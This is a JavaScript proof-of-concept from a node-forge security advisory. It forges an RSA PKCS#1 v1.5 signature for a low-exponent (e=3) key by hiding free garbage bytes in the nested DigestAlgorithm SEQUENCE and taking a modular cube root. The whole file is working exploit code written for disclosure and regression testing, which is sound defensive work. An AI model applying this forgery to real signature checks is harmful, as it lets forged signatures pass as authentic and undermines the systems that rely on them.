// Security Advisory PoC
//
// https://github.com/digitalbazaar/forge/security/advisories/GHSA-2g46-22mc-6gwp
//
// Reported by Geo (@geo-chen). PoC from PR #1160 by @shaswata56.
//
'use strict';

// Security Advisory PoC
//
// CVE-2026-85393 / GHSA-86w9-cpqp-85rv
// https://github.com/digitalbazaar/forge/issues/1149
//
// RSA PKCS#1 v1.5 signature forgery via garbage in the nested
// DigestAlgorithm SEQUENCE (incomplete CVE-2026-33894 fix). Reported by
// geo-chen.
//
// The fix for CVE-2026-33894 only checked the element count of the outer
// DigestInfo SEQUENCE. asn1.validate() ignores extra children of the nested
// DigestAlgorithm SEQUENCE, so extra "garbage" elements hidden there are
// neither consumed by the validator nor counted by the outer element count
// check. An attacker can use those free bytes to forge a signature for a
// low public exponent key (e=3) without the private key:
//
// - the 32-byte digest is fixed at the bottom of the encrypted block, by
//   taking a modular cube root: s0^3 === [04 20 || digest] (mod 2^272)
//   (cubing is a bijection on odd residues mod 2^n, so s0 always exists),
// - the padding/ASN.1 framing is fixed at the top, and
// - ~189 free garbage bytes inside the nested DigestAlgorithm SEQUENCE
//   absorb the middle of S^3: candidates s = s0 + t*2^272 step through the
//   window [framing||00..00||digest, framing||ff..ff||digest) in steps far
//   smaller than the window, so an exact cube S^3 matching a block that
//   node-forge accepts is found immediately.
//
// Test vectors from this code were added in the RSA unit tests.

const crypto = require('crypto');
const forge = require('../../lib/index');

const toBig = b => BigInt('0x' + (b.toString('hex') || '0'));
function toBuf(n, len) {
  let h = n.toString(16);
  if(h.length % 2) h = '0' + h;
  const b = Buffer.from(h, 'hex');
  return b.length < len ? Buffer.concat([Buffer.alloc(len - b.length), b]) : b;
}
function cbrtFloor(n) {
  let lo = 0n;
  let hi = 1n;
  while(hi * hi * hi <= n) hi <<= 1n;
  while(lo + 1n < hi) {
    const mid = (lo + hi) >> 1n;
    if(mid * mid * mid <= n) lo = mid;
    else hi = mid;
  }
  return lo;
}
const cbrtCeil = n => {
  const f = cbrtFloor(n);
  return f * f * f === n ? f : f + 1n;
};
function modPow(b, e, m) {
  let r = 1n;
  b %= m;
  while(e > 0n) {
    if(e & 1n) r = r * b % m;
    b = b * b % m;
    e >>= 1n;
  }
  return r;
}
function derLen(len) {
  if(len < 0x80) return Buffer.from([len]);
  if(len <= 0xff) return Buffer.from([0x81, len]);
  return Buffer.from([0x82, (len >> 8) & 0xff, len & 0xff]);
}

// public key fixtures used by the RSA unit tests (e=3)
const N_HEX =
  'E932AC92252F585B3A80A4DD76A897C8B7652952FE788F6EC8DD640587A1EE56' +
  '47670A8AD4C2BE0F9FA6E49C605ADF77B5174230AF7BD50E5D6D6D6D28CCF0A8' +
  '86A514CC72E51D209CC772A52EF419F6A953F3135929588EBE9B351FCA61CED7' +
  '8F346FE00DBB6306E5C2A4C6DFC3779AF85AB417371CF34D8387B9B30AE46D7A' +
  '5FF5A655B8D8455F1B94AE736989D60A6F2FD5CADBFFBD504C5A756A2E6BB5CE' +
  'CC13BCA7503F6DF8B52ACE5C410997E98809DB4DC30D943DE4E812A47553DCE5' +
  '4844A78E36401D13F77DC650619FED88D8B3926E3D8E319C80C744779AC5D6AB' +
  'E252896950917476ECE5E8FC27D5F053D6018D91B502C4787558A002B9283DA7';

// ASN.1 constants for the forged block
// inner DigestAlgorithm SEQUENCE content, up to the garbage:
// OID sha256 (06 09 ...) + NULL params (05 00) + garbage OCTET STRING header
const OID_SHA256 = Buffer.from('0609608648016503040201', 'hex');
const NULL_PARAMS = Buffer.from('0500', 'hex');
// digest OCTET STRING header (04 20)
const DIGEST_OCTET_HDR = Buffer.from('0420', 'hex');

function main() {
  const n = BigInt('0x' + N_HEX);
  const k = N_HEX.length / 2;

  const msg = 'hello world!';
  const digest = crypto.createHash('sha256').update(msg).digest();
  if(digest.toString('hex') !==
    '7509e5bda0c762d2bac7f90d758b5b2263fa01ccbc542ab5e3df163be08e6ca9') {
    throw new Error('unexpected sha256 digest');
  }

  const ffCount = 8; // spec minimum for PKCS#1 v1.5 padding

  // Iterate garbageLen to a fixed point so the total block is exactly k
  // bytes, like the GHSA-ppp5-5v6c-4jwp PoC does.
  let garbageLen = 0;
  for(let i = 0; i < 8; i += 1) {
    const gHdrLen = 1 + derLen(garbageLen).length;
    const innerLen = OID_SHA256.length + NULL_PARAMS.length +
      gHdrLen + garbageLen;
    const innerHdrLen = 1 + derLen(innerLen).length;
    const outerLen = innerHdrLen + innerLen +
      DIGEST_OCTET_HDR.length + digest.length;
    const outerHdrLen = 1 + derLen(outerLen).length;
    const fixed = 2 + ffCount + 1 + outerHdrLen + innerHdrLen +
      OID_SHA256.length + NULL_PARAMS.length + gHdrLen +
      DIGEST_OCTET_HDR.length + digest.length;
    const next = k - fixed;
    if(next === garbageLen) {
      break;
    }
    garbageLen = next;
  }
  const gHdrLen = 1 + derLen(garbageLen).length;
  const innerLen = OID_SHA256.length + NULL_PARAMS.length +
    gHdrLen + garbageLen;
  const innerHdr = Buffer.concat([Buffer.from([0x30]), derLen(innerLen)]);
  const outerLen = innerHdr.length + innerLen +
    DIGEST_OCTET_HDR.length + digest.length;
  const outerHdr = Buffer.concat([Buffer.from([0x30]), derLen(outerLen)]);

  // Top framing: padding + outer SEQUENCE + inner SEQUENCE + OID + NULL +
  // garbage OCTET STRING header. Bottom: digest OCTET STRING. The garbage
  // bytes in between are free and absorb the middle of S^3.
  const prefix = Buffer.concat([
    Buffer.from([0x00, 0x01]),
    Buffer.alloc(ffCount, 0xff),
    Buffer.from([0x00]),
    outerHdr,
    innerHdr,
    OID_SHA256,
    NULL_PARAMS,
    Buffer.from([0x04]), derLen(garbageLen)
  ]);
  const suffix = Buffer.concat([DIGEST_OCTET_HDR, digest]);
  if(prefix.length + garbageLen + suffix.length !== k) {
    throw new Error('block size mismatch');
  }

  // Pin the bottom: s0^3 === suffix (mod 2^(8*suffix.length)).
  // Cubing is a bijection on odd residues mod 2^m (the group order is a
  // power of two), so the inverse is exponentiation by d with 3d === 1
  // mod 2^(m-1); for even m, d = (2^(m+1) + 1) / 3.
  const bits = BigInt(8 * suffix.length);
  const M = 1n << bits;
  const suffixInt = toBig(suffix);
  if(suffixInt % 2n === 0n) {
    throw new Error('suffix must be odd for the cube root to exist');
  }
  const d = ((1n << (bits + 1n)) + 1n) / 3n;
  const s0 = modPow(suffixInt, d, M);
  if(modPow(s0, 3n, M) !== suffixInt) {
    throw new Error('cube root lifting failed');
  }

  // Window of block values: [prefix||00..00||suffix, prefix||ff..ff||suffix)
  const low = toBig(Buffer.concat([prefix, Buffer.alloc(garbageLen), suffix]));
  const high = low + (1n << BigInt(8 * garbageLen + 8 * suffix.length));

  // Smallest s >= cbrtCeil(low) with s === s0 (mod 2^bits), then check that
  // S^3 lands inside the window (it steps by ~3*s^2*2^bits << window width).
  let s = cbrtCeil(low);
  let q = (s - s0) / M;
  if(q < 0n) {
    q -= 1n;
  }
  s = s0 + q * M;
  if(s < cbrtCeil(low)) {
    s += M;
  }
  const blockInt = s * s * s;
  if(blockInt < low || blockInt >= high || blockInt >= n) {
    throw new Error('no candidate in interval');
  }

  const block = toBuf(blockInt, k);
  const sig = toBuf(s, k);
  if(!block.subarray(0, prefix.length).equals(prefix) ||
    !block.subarray(k - suffix.length).equals(suffix)) {
    throw new Error('forged block layout mismatch');
  }

  const publicKey = forge.pki.setRsaPublicKey(
    new forge.jsbn.BigInteger(N_HEX, 16),
    new forge.jsbn.BigInteger('3', 10));
  const md = forge.md.sha256.create();
  md.update(msg, 'utf8');

  let forged;
  try {
    forged = publicKey.verify(md.digest().getBytes(), sig.toString('binary'));
  } catch(err) {
    forged = 'threw: ' + err.message;
  }

  console.log('block (I):');
  console.log(block.toString('hex').replace(/(.{64})/g, '$1\n'));
  console.log('signature (S):');
  console.log(sig.toString('hex').replace(/(.{64})/g, '$1\n'));
  console.log('garbageLen:', garbageLen, 'ffCount:', ffCount);
  console.log('forged verify result:', forged);
}

main();
